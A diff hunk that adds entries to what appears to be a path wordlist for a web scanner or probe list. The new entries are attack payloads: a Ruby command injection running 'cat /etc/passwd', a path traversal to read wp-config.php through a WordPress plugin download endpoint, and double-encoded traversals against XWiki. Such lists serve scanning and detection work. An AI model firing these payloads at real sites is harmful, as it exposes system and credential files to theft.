@@ -307,3 +307,8 @@
 /bugs/verify.php?confirm_hash=&id=1
 /installed_emanual_list.html
 /api/project
+?IO.popen(%27cat%20%2Fetc%2Fpasswd%27).read%0A%23
+/api/version
+/wp-json/wooconvo/v1/download-file?order_id=1&filename=../../../../wp-config.php
+/xwiki/bin/skin/..%252f/..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd
+/bin/skin/..%252f/..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd
